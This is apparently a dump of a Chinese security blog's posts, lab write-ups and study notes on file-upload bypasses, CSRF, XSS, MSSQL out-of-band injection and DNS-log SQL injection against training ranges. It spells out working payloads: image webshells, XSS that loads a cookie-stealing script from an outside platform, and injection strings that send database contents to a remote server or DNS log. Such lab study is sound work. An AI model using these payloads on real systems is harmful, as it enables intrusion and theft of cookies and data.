用 ASP 替代 CGI 和 Perl 的优势在于它的简易性和速度 由于 ASP 代码无法从来浏览器端察看，ASP 确保了站点的安全性。 优秀的 ASP 编程可将网络负载降至最低其实asp文件就和html,php是差不多的脚本语言,其实就是一个容器 Asp特性 )))就是说asp后缀的如果不让上传可以用这些绕过,这些事iis的特性,会把cer,asa也用asp去解析 Asp漏洞 在一般得语言中,分号是结束一句代码得意思.在asp文件中,分号还能有着截断得作用,类似于0x00和%00 于是就可以这样as.asp;.jpg但也是和00截断有一点区别,当上传成功后去url中访问00截断需要把阶段以后的给删掉访问,但是asp这里就不需要,依旧要写在url中要记得这是6.0特有的漏洞Asp可能要被淘汰了,因为主流是php CGI解析漏洞 CGI（Common Gateway Interface），即通用网关接口，是WWW技术中最重要的技术之一，是外部应用程序（即CGI程序）与WEB服务器之间的接口标准，负责在CGI程序和Web服务器之间传递信息。CGI是Web服务器运行时，调用外部应用程序（即CGI程序）的规范，CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Web浏览器，CGI将Web的一组简单的静态超媒体文档变成一个完整的、新的交互式媒体，按照CGI编写的程序可以扩展Web服务器功能。可以把他理解为一个收发文件的)就是说,这个函数查找绝对路径时会做两步,先找到phpinfo.jpg/1.php发现没有这个路径,但有这个文件,就后退一个,路径就变成phpinfo.jpg,把1.php当成文件处理.但是他查找后缀名时,就直接从最后找这个漏洞16年比较盛行,现在防范的比较多,,不过最近又有新的漏洞了nginx,可以去安全客查看利用直接在文件路径后加上/.php即可,看pass-23实操","path":"2020/04/06/zkaq文件上传漏洞-三/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(二)","text":"%00截断 了解%00实际上我们要先了解0x00, 0x00实际上是一个十六进制表示方式，实际上就是表示ascii码值为0，有些函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了这有什么用呢? 在文件上传时，如果遇到了白名单机制只允许上传jpg后缀的，在没有解析漏洞的情况下我们该怎么办?JPG格式并不会被解析，那么我们需要绕过上传过滤。假如我写了1.php%00.jpg传参之后，有些过滤都是直接匹配字符串，他强行匹配到了结尾是jpg，然后允许上传，但是php的丽数去执行的时候他读取到0x00认为结束了，那么这个文件就变成了1.php 00截断 %00实际.上和00截断是一模一样的原理，只不过%00是经过URL编码的，%00解码后就是0x00截断的那个字符建议多使用gif木马,因为不会被二次渲染.有些二次渲染是有一部分不会变,另一部分会改变得,可以通过加在不变得地方来防止被渲染","path":"2020/04/06/zkaq文件上传漏洞-二/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(一)","text":"客户端检测 客户端校验: - -般是在网页上写一段Js脚本，用Js去检测，校验上传文件的后缀名，有白名单也有黑名单。判断方式:在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如:只允许上传jipg/jpeg/ .png后缀名的文件，而此时并没有发送数据包，所以可以通过抓包来判断，如果弹出不准上传，但是没有抓到数据包，那么就是前端验证前端验证非常不可靠，传正常文件改数据包就可以绕过，甚至关闭JS都可以尝试绕过白名单:允许什么,,黑名单:不允许什么 (一般白名单比白名单更安全)服务器端检测 服务端检测几个常见的手段: 1.检查Content-Type (内容 类型)2.检查后缀( 检查后缀是主流)3.检查文件头如何绕过Content-Type (内容类型)和文件头检测，这个时候我们就要去制作一个图片马了图片马的制作很简单，写一个一句话木马放在txt文件然后找- -张你喜欢的图片(注意文件大小，越小越好)然后打开cmdcopy a.jpg/b+ 1.xt 123.jpg (将a.jpg和1.txt 合并为123.jpg (注: 这个是效果))图片马可以很好的绕过内容类型和文件头,这个a.jpg越小越好/b的意思是用二进制去执行.新的图片打开后划到最小面会有这句任意代码执行函数出现 小知识点 如何用图片藏东西?把机密.txt压缩后和一张图片合并,合并成了一张图片,普通人看就是一张图片,但是你把他后缀名改成zip之后会发现机密.txt就在里面) 为何制作木马图的图片要比较小?因为去解析这个php代码的时候一直碰到不认识的,那就继续往下找,但它不是一直往下找的,如果超过了某个阈值就会停止导致一句话木马没有被执行 图片马上传成功后就可以使用菜刀去连接","path":"2020/04/06/zkaq文件上传漏洞-一/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"CSRF--zkaq靶场","text":"进入管理员后台 进入到后台登录界面(./dede),通过爆破进入到后台.进入到文件式管理器,发现可以新建文件.直接新建一个一句话木马.)然后去访问成功getshell了 csrf )新建一个phpinfo()文件,点击保存抓包.)使用burp自带工具制作成csrf攻击代码,复制创建的代码保存,修改成html文件.退出登录试试刷新token,然后点击发现直接跳转到后台页面了说明是存在csrf的.如果觉得需要手动点击太明显,那就改成自动触发 function validate(){document.getElementById(&apos;aa&apos;).submit(); } setTimeout(validate,100) 再隐蔽一点,自己做钓鱼网站,然后再index.php里面加入一句&lt;iframe src=&quot;(目录下的scrf攻击代码的文件名)&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;这样人家点击你的钓鱼网站之后就会自动触发你写的攻击代码,并且直接调用里面的函数,在index.php下生成一个内置网页,高宽都是0还都看不见.然后flag就在csrf目录下疑问 这边后台创建完文件之后都可以直接getshell了,为啥还要csrf?又去听了一遍课程,这个靶场只是告诉你如何去实现csrf攻击,自己充当了攻击者和管理员的角色.管理员在登陆过后有cookie之后,点击了你的钓鱼网站,你就会获得他的信息了,也可能会自动创建账户什么的(看你恶意代码怎么写了)","path":"2020/04/05/CSRF-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"}]},{"title":"CSRF","text":"定义 CSRF (Cross-site request forgery)跨站请求伪造:也被称为“One Click Attack”或者Session Riding,通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS) ，但它与XSs非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击 相比，CSRF攻击往往不大流行(因此对其进行防范的资源也相当稀少)和难以防范，所以被认为比XSs更具危险性。其实说白了，csrf漏洞的成因就是网站的cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的csrf脚本或包含csrf脚本的链接，可能会执行一些用户不想做的功能(比如是添加账号等) 缺点与防范 核心在于缺乏验证 像验证码是他最好的防御方法修改密码,我们要输入一个验证码做任何操作都加个验证码其实完全杜绝CSRF 开发他们为了安全设置了-个东西叫做Token,是一个验证机制每个请求的表单里面都存在着一个字段，这个字段就是Token,他会随机生成一段字符串,然后cookie里面也带有这段字符串.如果用户发起请求的token字段和服务器端的不一样就会认为这不是你本人访问的就会拒绝访问,原理和验证码差不多. 小知识点 一个网页如果没有token,就可以去尝试csrf 抓包时Token不一定就叫token,可能会被改成其他名字,什么uid拉什么什么的.最简单的验证是不是token的办法注册两个账号然后抓一一个账号的包,然后制作成CSRE攻击然后换一个账号去触发,看看是否有效果 Referer是请求头里的一部分,用于告诉浏览器你是从哪个网站过来的,如果是主动进来的就不会有referer.虽然他能起到一定的防御作用,但是这个是可以伪造的……只有cookie是最好的验证手法 csrf再src平台上可能会被定为小危险,然后不给你钱,自己再偷偷修复??? 测试csrf流程 先注册一个账号,然后抓取数据包,burp里有一个这个功能可以直接制作带有csrf的html代码,然后保存成html文件. 再注册一个账号,此时去打开刚刚保存的html文件,如果刷新第二个账号后发现内容发生了变化则说明存在有scrf漏洞 其实burp害怕黑客去去攻击别人所以做的比较柔和,需要点击才会触发,但是把点击事件去掉,改成直接调用函数(如下图)就变成了自动触发(恶意代码是被封装在一个js函数里的) 疑问 为啥执行了phpinfo之后就说取得了webshell?因为phpinfo是代码,不是系统命令.而取得了webshell之后是可以执行php代码的,所以说如果可以执行phpinfo就可是getshell了 靶场实战 传送门:https://wxnsoul.github.io/2020/04/05/CSRF-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/CSRF/","date":"04-05","excerpt":"","tags":[{"name":"CSRF","slug":"CSRF","permalink":"http://wxnsoul.github.io/tags/CSRF/"}]},{"title":"Dom Based XSS--zkaq靶场","text":"测试发现 进入发现这是一个聊天室,有很多很多的提交框,自然会想到&lt;script&gt;alert(1)&lt;/script&gt;)很不幸直接被发现了)直接被拦截了,因为cookie信息一直在所以刷新是没有用的,手动找到后删除cookie信息继续恢复正常访问然后一个一个地方试了下发现名称的地方试不可以xss的,所以被拦截这里就需要使用burp了,很多前端的拦截burp就可以绕过去Burp是用于寻找输出点最好的工具)抓包把浏览器中有框框的地方全部给改成alert(1)传过去,但是没有什么用处,这时候就需要查看页面源代码来寻找其余可以插入的地方.)这时候发现这个您所在的位置这里很可以,可能是服务器端发送过来的,因为随便输入的数据也会跟在后面显示)查看页面源码,直接就是document.write写我url栏里输入的,所以这边肯定是服务器端发送过来的(如果是客户端的他不会知道我要输入啥),可以考虑尝试一下直接写入不行,转native编码后绕过就可以了)接着尝试使用比较老套的绕过旧waf的方法)确实奏效了,只是没有注意闭合问题)这样也不行,,最后添加上//后又被安全感拦截了改成这样,用分号结束一段语句,最后闭合,成功弹出! mark因为已经是服务器端传来的,所以这段代码已经在数据库中变成了存储型xss,此时再在别的地方&lt;script&gt;alert(1)&lt;/script&gt;就不会被拦截了,比如在字体里输入))也可以这样直接闭合来输出.因为html的优先级高于js,所以两个script标签会直接先闭合,最后加上//注释符也可以,这就是html的高容差性.注:一开始自己这么尝试的不行就是因为没有闭合标签在xs.sb搭建xss代码后将恶意代码输入到地址栏,成功看到有内容访问)看tips根据tips去访问dom.php?url=这其实是个模拟静态页面生成的 页面将刚刚的恶意代码放在url后面,他就会去访问这个你写的网址,这时候再去访问log.html,就会加载出来刚刚访问的,这个页面里面有用py写的脚本,会去不停的访问这个dom.php?url&gt;里的页面","path":"2020/04/05/Dom-Based-XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"}]},{"title":"Dom Based XSS","text":"前言 原本不应该XSS的地方,但是经过js的操作之后产生了xss.比如说,后端过滤了script,但是js可以把+号变成p,那我传入scri+t不仅没有被过滤,在js的操作下又变成了script.这个情况不是都有也不是都没有,可能会存在. 核心 document是可以被操作的网页,可以被js操作比如说document.cookie(cookie注入的时候))Xss平台窃取cookie的时候其实就使用了document.cookie这样的东西 漏洞的产生 DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。 DOM—based XSS攻击原理 DOM—based XSS攻击源于DOM相关的属性和方法，被插入用于XSS攻击的脚本。一个典型的例子如下所述。H TTP请求http：／／www．DBXSSed．site／welcome．html?name=zhangsan使用以下的脚本打印出登录用户zhangsan的名字，即如果这个脚本用于请求http：／／www．DBXSSed．site／wPJconle．html?name=&lt;script&gt;alert(&quot;XSS&quot;)&lt;／script&gt;时，就导致XSS攻击的发生。当用户点击这个链接，服务器返回包含上面脚本的HTML静态文本，用户浏览器把HTML文本解析成DOM，DOM中的document对象URL属性的值就是当前页而的URL。在脚本被解析时，这个URL属性值的一部分被写入HTML文本，而这部分HTML文本却是JavaScript脚本，这使得&lt;script&gt;alert(“XSS”)&lt;／script&gt;成为页面最终显示的HTML文本，从而导致DOM—base XSS攻击发生。DOM—based XSS攻击过程如图l所示。注意（5）黑客提供的URL被页面的JAVASCRIPT使用，生成攻击载荷。 小知识点 Js这个东西他是在客户端运行的,不占用客户端端资源 伪静态网页:会刷新,使用document.lastModified不断刷新看看时间是否发生变化,变化的就是伪静态.完全静态的页面时无法注入的 Document.write会在页面输入信息)但是要记得他是js语句,js会解码某些编码,比如native编码)ASCII转native之后在输出成功的弹出了1,所以有些时候可以考虑用编码来绕过 寻找xss漏洞最好使用burp抓包,传数据之后可以在burp里进行修改以此来绕开前端的防护,有框就插 dom型xss既可以时反射性,也可以是存储型,就像延时注入和布尔盲注一样都是盲注.dom型到底属于哪一类就看有没有js的参与.有就是存储型,没有就是反射型 XSS解决方案常用的防止XSS技术包括： 与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。 不仅要验证数据的类型，还要验证其格式、长度、范围和内容。 不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。 对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。 在发布应用程序之前测试所有已知的威胁。 靶场地址 传送门: 原文地址 https://www.cnblogs.com/phoenix--/articles/2158202.html","path":"2020/04/05/Dom-Based-XSS/","date":"04-05","excerpt":"","tags":[{"name":"Dom Based XSS","slug":"Dom-Based-XSS","permalink":"http://wxnsoul.github.io/tags/Dom-Based-XSS/"}]},{"title":"存储型XSS--zkaq靶场","text":"漏洞复现 一上去发现是finecms,存在通杀漏洞,百度查找前人留下的文章即可注意,遇到通杀型漏洞一定要本地搭建本地复现线上实战去a5源码站下载源码,一定要安装在3W,80端口的根目录下!(finecms的bug)如果环境搭建好之后访问时说数据库出错,连接不上数据库,那是因为这源码别人家用过了安装了她自己机子上的数据库,然后被你扒下来了,所以连接不上数据库,重新访问install安装即可)根据mvc架构的一个传参方式输入c和m的参数就可以实现js弹窗 http://59.63.200.79:8082/index.php?c=mail&amp;m=%3CsCRiPt%20sRC=//xs.sb/QeiH%3E%3C/sCrIpT%3E直接传入恶意代码可以发现自己的xss平台上就会有cookie了然后等待管理员点击错误日志就行,因为靶场被设置了每隔一会就会去点击,所以等待一会即可找到flagzKaQ-01sdfDCo0 流程总结 搭建本地环境实现漏洞复现,并找到存储型漏洞如何实现 搭建xs平台,按照漏洞实现方法插入恶意代码(靶场中是mvc框架传参,直接把参数改成sx平台的恶意代码) 等待管理员查看错误日志,获取cookie","path":"2020/04/05/存储型XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"}]},{"title":"存储型XSS","text":"介绍 存储型XSS会把恶意代码嵌入到服务器端,这样每个用户去访问都会把服务器端的恶意代拿回到浏览器端核心:写的进去,输的出来,写的进去是指比如注册填写账号密码邮箱啥的,你得代码输进去了,登进去发现又昵称,姓名的显示那这就是可以输出.密码就属于输不出来打网站要先正常走一遍看情况,不要一上来就去尝试xss有些时候传参会很隐蔽,建议抓包修改前言 一些xss平台会可以看到你浏览器内的cookie,所以建议登录的时候要用一个不常用的浏览器或者使用谷歌的无痕模式这次我登录的是xs.sb/xss.php,注册登录后,如果只需要窃取cookie,那就点击xss.js和默认模式两个,然后下一步会有源码和教你如何使用的样例出现 Xss的克星 被过滤 长度限制 [我们用户名那个地方存在XSS但是那个地方最多显示10个字符]浏览器端可以修改但是服务器端如果被限制了那就没有用了所以实在没有办法可以使用上图中的极限代码 小知识 一.遇到通杀型漏洞一定要本地搭建本地复现线上实战 1.出了错很懵逼2.你打过去了能成功的几率自己也不知道，然后结果过了N久打到了，但是你已经不关注网站了。3.打过去直接炸了二.cms有bug,必须通过127.0.0.1和80端口访问,就是只能在根目录下,127.0.0.1/a都不行 上课举例 上课举例(搭建环境):将这段攻击代码复制后在靶场的留言台的主题输入,然后项目里就会出现访问记录 ))使用burp抓包发现,这段代码导致你会去访问xs.sb下的某个地方甚至带着cookie发了过去 漏洞复现 接着是漏洞复现搭建靶场,注意看前面的小知识点.如果环境搭建好之后访问时说数据库出错,连接不上数据库,那是因为这源码别人家用过了安装了她自己机子上的数据库,然后被你扒下来了,所以连接不上数据库,重新访问install安装即可))装好了之后进入后台可以发现错误日志的url)修改后可以发现)后台显示也跟着改了.百度finecms存储型xss后可以发现有通杀)根据mvc架构的一个传参方式输入c和m的参数就可以实现js弹窗前台的防护一般比后台高,前台能弹窗后台一定也能 这是就可以搭建一个xss站点来钓鱼,依旧使用xs.sb/xss.php来创建项目这边就可以直接插入恶意代码来窃取cookie(注意m的传参是什么?是搭建的xs平台里面的存储型代码!!)过一阵子只要等管理员点击到日志就会被窃取cookie 靶场地址 传送门:https://wxnsoul.github.io/2020/04/05/%E5%AD%98%E5%82%A8%E5%9E%8BXSS-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/存储型XSS/","date":"04-05","excerpt":"","tags":[{"name":"存储型XSS","slug":"存储型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/"}]},{"title":"反射型XSS--zkaq靶场","text":"题目分析 这边有输入框就直接尝试输入&lt;script&gt;alert(1)&lt;/script&gt;回车后发现上面也会出现一行没有找到…结果,查看源码)可以发现上面的尖括号是被过滤了的,但是这个提交框的没有.肯定选择从提交框入手.这次注意闭合重新尝试&quot;&lt;script&gt;alert(1)&lt;/script&gt;//)查看源码可惜发现双引号被转移了. 利用html的高兼容性 单引号可以闭合双引号,所以改用单引号 ‘alert(1)//点击输入后有相关结果提示但是输入框里的东西没了,说明刚刚的被当作html代码执行了 事件型触发xss 刚刚第一种方法失败了,所以尝试第三种方法触发xss这时候用oninput标签,意义是输入框里要是输入东西就会产生弹窗.再输入1,就出flag了 &#39;oninput=alert(1)//因为弹窗弹的东西被nf修改了所以弹出的不是自己写的1所以关键处还是在于找到可用的输入输出点 &lt;script&gt;alert(1)&lt;/script&gt;这句话竟然直接在blog跳出弹窗了…疑问解决 做题的时候碰到一个疑问)我一开始以为//把后面的”&gt;全给注释了,是html的高兼容性导致代码成功执行了.然后想自己把”&gt;补全)但是这样却不能触发xss了.后来问过辅导员之后明白了,//注释的是js代码,oninput就是js代码,它注释的是这个单引号,而后面的”&gt;是html代码,html代码的注释是&lt;!- 注释的内容 -&gt;.所以自己再填加”&gt;后就会出现冗余的”&gt;,导致html代码错误无法加载出js代码","path":"2020/04/05/反射型XSS-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"}]},{"title":"反射型XSS","text":"XSS得原理分析与解剖 核心:HTML代码注入,用户输入得数据会被当作HTML代码执行(这里的HTML指的是前端所有语言, Xss.主要就是调用Js业内一般把弹窗函数作为一个存在xss的认定)总结:xss就是拼接恶意的HTML代码 简单演示 &lt;?php echo $_REQUEST[&#39;a&#39;]; ?&gt;这是很简单得一段php源码普通用户执行)不做任何过滤可以拼接html语句市面上一般以弹窗语句作为可以xss得标准为什么通过弹窗判定?因为XSS攻击如果需要达到真正的利用需要调用JsCookie是保存在浏览器里面的,Js可以调用浏览器来获取你的cookie同源性法则 只能获取同一个域名,端口得cookie,用户如果登陆过a站点但是没有登陆过b站点,那就只能偷到a站点得cookie 触发js得方法 1.&lt;script&gt;alert(1)&lt;/script&gt; 2.伪协议触发伪协议不同于因特网上所真实存在的协议，如http://, https://， ftp://,伪协议只有关联应用能够用，比如php:// tencent:/( 关联QQ)javascript:伪协议实际上声明了URL的主体是任意的javascript代码javascript:alert(1)3. 事件型触发法&lt;img src=’a ‘onerror=alert(1) /&gt;只要满足条件就不会触发,不满足条件就会促会发onerrer里面写的总结:三种方法比较:第一种比较容易,但也是最多被防护得,经常会被过滤&gt;;/等符号第二种用到的很少,比较鸡肋第三种就是平时挖洞常用的 HTML前端语言特点 拥有相当高的容错性,因为是直接和用户交互的,所以必须容错性高,不然影响用户体验,换句话说,#代码中哪里对的就执行,哪里错的就不执行#.而后端动态语言就不会这样,碰到错误就停止 Xss类型 反射性xss在src上一般是认为是鸡肋的,在项目上可能会认为是中危最常见的情况A网站存在了反射型xss那么偷别人Cookie . 1.人家登陆了A站且没失效2.人家访问你发送过去的链接 你关闭页面但是cookie还在浏览器和服务器端,你关闭浏览器只是删除了浏览器上的cookie! 操作思路: 一.寻找输入点和输出点二.寻找没有被html实体编码的输入输出点,如果有那么尖括号会被转义,三种xss方式都得用到尖括号,就都会失效 小知识点 不要拿谷歌浏览器去做反射型xss,谷歌自己会做防护 Html中单引号可以闭合双引号) 靶场地址 传送门:https://wxnsoul.github.io/2020/04/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/反射型XSS/","date":"04-05","excerpt":"","tags":[{"name":"反射型XSS","slug":"反射型XSS","permalink":"http://wxnsoul.github.io/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"}]},{"title":"反弹注入--zkaq靶场","text":"注意点 Mssql的注释符必须用–+,不能用# Mssql的联合查询必须写union all Mssql的select 1,2,3得写select null,null,null Mssql有自带的数据库和表 先正着做一遍 查找注入点 1’ union all select null,null,null –+通过用数字和字符串替代null发现只要第二个null的地方有字符注入点,第一个有整型注入点(这就是因为mysql数据库会包容不兼容类型而mssql不会,所以得拿null去填充) 查找库名 1&#39; union all select null,name,id from dbo.sysdatabases --+ 注意,这里的name不是字段,不是表,而是描述表的信息,就像原理分析里面的唯一标识id一样,可以查找出自带库中的表的name和id. 查找用户创建的表名 1&#39; union all select id,name,null from dbo.sysobjects where xtype=&#39;U&#39; --+ 查找指定表中字段 1&#39; union all select null,name,id from dbo.sysdatabases --+ 查值 可以看到password和token字段比较可疑,去查一下 1’ union all select null,token,null from admin –+得出结果 接下来反着使用反弹注入做 查表 id=1&#39;;insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.amdin select id,name from dbo.sysobjects where xtype=&#39;U&#39; --+)在远程数据库里就会有数据插入(因为插入要求字段一样,所以单独创了一张表来配合使用,全部设置varchar即可) 查找指定表中字段 insert into opendatasource (‘sqloledb’, ‘server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666’) . wxchen666.dbo.id select name from dbo.syscolumns where id=1977058079 –+ 查值 insert into opendatasource (&#39;sqloledb&#39;, &#39;server=den1.mssql8.gear.host,1433; uid=wxchen666; pwd=Zw037__lG5Fa; database=wxchen666&#39;) . wxchen666.dbo.id select token from admin --+ 总结 就是一个语法得问题,记住就行了,然后多注意一些和mysql不同的操作","path":"2020/04/05/反弹注入-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"Mssql注入--反弹注入","text":"一、MSSQL反弹注入使用场景 明明是SQL的注射点却无法进行注射,注射工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注射结果等，这些都是在注射攻击中常常遇到的问题。为了解决以上这些疑难杂症，比较好的解决方法就是使用反弹注射技术，而反弹往射技术则需要依靠opendatasource函数支持.反弹注入也仅限于mysql 二、快速搭建一个MSSQL环境(骚姿势) http://www.webweb.com/(香港云)https://my.gearhost.com/Account/Login?ReturnUrl=%2fCloudSite(国外的虚拟主机)https://bccto.me/(十分钟邮箱)59.63.200.79:8015靶场去香港云或者虚拟云主机注册一个账号(用十分钟邮箱去注册),然后创立数据库即可三、MSSQL反弹注入语句解析 如何做mssql显错注入?Select 1,2,3这种语句是对mysql这样的对字符要求不严格的会生效,像access,mssql这样的拿select null,null,null去测试才对四.MSSQL的自带库 查询数据库select name from dbo. Sysdatabases自带数据库:master,tempdb查询表名select name from dbo. Sysobjects where xtype=&#39;U&#39;U是指user创建的表,S指系统创建的,所以知不知道库没有太大影响注意这张我创的test表(字段是a,b,c,d),但是他显示的有name,id,xtyoe,uid等等信息,这些都似乎用于描述表的,所以可以通过id来确定我要找的字段,id是唯一确定哪张表的这样查出的字段都是test表中的,不然会查出所有表中的所有字段 五.反弹注入语句 前面是常规操作,接下来时反弹注入 insert into opendatasource ( ‘sqloledb’ , ‘ serve r=SQL5009. webweb. com, 1433; uid=DB 1 4A5E44zkaq admin; pwd=Zkaqz kaq; database=DB14A5E44 zkaq’) .DB 1 4A5E44 zkaq. dbo. temp select * from admin—-.解析:sqloledb指连接mssql型数据库,erve r=SQL5009. webweb. com指你自己的数据库的外网地址.1433是指端口号,uid=DB 1 4A5E44zkaq admin指账号,pwd=Zkaqz kaq指连接的密码,database=DB14A5E44 zkaq’指连接哪个数据库,.DB 1 4A5E44 zkaq. dbo. temp是指库.表,就是选择哪个表的 整句话的意思就是把本地admin表(就是你攻击的表)的数据取出后插入到外网的自己连接的数据库上(迎合字段而创建)插入数据必须要满足字段相同Mssql的注释只有–+ 堆叠注入 你输入的sql语句可以多行执行.再参数后面加上; 然后再写sql语句.只需要在参数后面加上;然后;后面的sql语句能执行就是堆叠注入了 靶场地址 反弹注入传送门:https://wxnsoul.github.io/2020/04/05/%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5-zkaqb%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/Mssql注入-反弹注入/","date":"04-05","excerpt":"","tags":[{"name":"Mssql注入--反弹注入","slug":"Mssql注入-反弹注入","permalink":"http://wxnsoul.github.io/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"}]},{"title":"DNS注入--zkaq靶场","text":"绕过安全狗 直接传参id=1&#39;and 1=1 -- qwe被狗咬住了查看源码发现过滤了and关键字.这边利用了apache得一个特性,碰到不认识的域名就会往前解析,所以输入 /1.txt?id=1 and 1=1 – qwe就绕了过去,因为不认识txt所以跑去解析index3.php了,还接受了id参数,但是使用 select database()是没有数据返回的. DNS攻击流程 登录到dnslog.cn网站随便获取一个域名，然后拼接想要的内容 /1.txt?id=1 and (select load_file(concat(“//“,(select database()),’.wwwwwwxxx.e6zfnp.dnslog.cn/dw’))) – qwe很明显得到了库名．这边非常需要注意语法,自己因为语法不熟练导致卡了很久,有select语句的记得用()把语句扩起来,让其作为sql语句执行,我一开始写的/1.txt?id=1 and select load_file(concat(&quot;//&quot;,(select database()),&#39;.wwwwwwxxx.e6zfnp.dnslog.cn/dw&#39;)) – qwe &lt;br&gt;/1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select table_name from information_schema.tables where table_schema=database()limit 1,1),&#39;.chenjiayn.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出表名为admin,news /1.txt?id=1 and (select load_file(concat(&quot;//&quot;,(select column_name from information_schema.columns where table_name=&#39;admin&#39; limit 1,1),&#39;.chenjiayan.e6zfnp.dnslog.cn/dw&#39;))) – qwe依次爆出字段为id,username,password /1.txt?id=1 and (select load_file(concat(“//“,(select password from admin limit 0,1),’.chenjiayan.e6zfnp.dnslog.cn/dw’))) – qwe得到flag.需要注意因为dns注入只能返回一条数据,所以需要记得使用limit来限定","path":"2020/04/05/DNS注入-zkaq靶场/","date":"04-05","excerpt":"","tags":[{"name":"Mysql注入--DNS注入","slug":"Mysql注入-DNS注入","permalink":"http://wxnsoul.github.io/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/"}]},{"title":"Mysql注入--DNS注入","text":"核心 通过dnslog(日志)把盲注变成有显错注入 函数介绍 LOAD_FILE()读取文件的函数读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_ allowed_ _packet (限制server接受的数据包大小函数，默认1MB)。如果该文件不存在或无法读取，因为前面的条件之一不满足， 函数返回NULL。这个功能不是默认开启的，需要在mysq|配置文件加一-句secure_file_priv=)效果图: Apache特性 当apache解析域名碰到不认识的东西时就会往前解析.所以当被拦截时就可以加一些不认识的东西让他去解析,比如1.txtand concat(“//”,select database(),”wdis.dnslog”) – wq)就可以把通过把库名拼接到dnslog上进行查看,但是只能拼接一条语句,所以只能用limit来限制 靶场实战 传送地址:https://wxnsoul.github.io/2020/04/05/DNS%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/05/Mysql注入-DNS注入/","date":"04-05","excerpt":"","tags":[{"name":"数据库注入--DNS注入原理","slug":"数据库注入-DNS注入原理","permalink":"http://wxnsoul.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/"}]},{"title":"access注入--zkaq靶场2","text":"判断是否存在cookie注入 